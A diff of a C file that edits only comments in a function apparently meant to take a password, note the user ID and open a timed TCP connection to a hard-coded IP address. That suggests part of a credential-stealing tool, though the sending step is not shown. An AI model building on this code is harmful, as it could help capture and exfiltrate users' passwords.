@@ -9,7 +9,7 @@
 #define IP 
 
 
-# Function
+
 int writetofile (char *password){
 
     /* Get UID */
@@ -39,7 +39,7 @@ int writetofile (char *password){
     int sock = 0, valread;
     struct sockaddr_in serv_addr;
 
-    /* Sock creation Error Catch*/
+    /* Sock creation Pt 2*/
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
         return -1;
     }
@@ -52,13 +52,14 @@ int writetofile (char *password){
     struct timeval timeout;
     timeout.tv_sec = 3;
     timeout.tv_usec = 0;
-
-    /* Catch Exceptions */
+    
     if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
         return -1;
     }
     if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
         // pass
+
+    /* set IP and set buffer */
     }
     if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
         return -1;
